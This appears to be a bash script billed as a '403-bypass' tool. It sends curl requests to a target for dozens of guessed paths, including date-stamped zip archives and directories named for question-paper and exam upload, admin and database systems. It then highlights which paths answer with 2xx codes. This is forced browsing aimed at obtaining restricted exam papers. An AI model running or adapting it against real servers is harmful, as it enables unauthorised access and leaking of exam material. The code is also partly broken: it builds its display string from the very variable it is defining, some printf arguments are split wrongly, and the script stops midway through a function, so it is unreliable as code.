#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 echo -n "Payload ["QPBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudManagement/"" -H "User-Agent: Mozilla/5.0")
